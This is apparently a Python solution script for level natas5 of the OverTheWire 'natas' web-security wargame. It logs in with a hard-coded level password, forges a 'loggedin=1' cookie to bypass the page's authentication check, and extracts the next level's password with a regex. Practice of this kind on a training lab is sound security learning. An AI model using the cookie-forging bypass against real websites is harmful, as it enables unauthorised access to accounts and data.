#Import Library
import requests
import re

#Setting variables needed
username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = f'http://{username}.natas.labs.overthewire.org/'
cookies = {'loggedin':'1'}

#Connect to natas
session = requests.Session()
response = session.request('GET', url, auth=(username,password), cookies=cookies)

#Filtering to get a password
#result = response.text
result = re.findall('Access granted. The password for natas6 is (.*)', response.text)[0]

print(result)
